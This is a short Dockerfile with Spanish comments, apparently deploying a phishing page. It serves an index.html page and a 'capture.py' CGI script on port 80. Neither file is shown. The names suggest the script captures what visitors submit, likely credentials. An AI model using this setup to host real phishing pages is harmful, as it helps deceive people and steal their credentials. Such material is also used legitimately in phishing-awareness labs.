# phishing-page/Dockerfile
FROM python:3.11-alpine

# Crear directorios: html y cgi-bin dentro de html, más logs
RUN mkdir -p /var/www/html/cgi-bin /var/log

WORKDIR /var/www/html

# Copiar página y script al directorio correcto
COPY index.html /var/www/html/index.html
COPY capture.py /var/www/html/cgi-bin/capture.py
RUN chmod +x /var/www/html/cgi-bin/capture.py

# Exponer puerto 80 y arrancar el servidor CGI de Python
EXPOSE 80
CMD ["python3", "-m", "http.server", "80", "--cgi", "--bind", "0.0.0.0"]
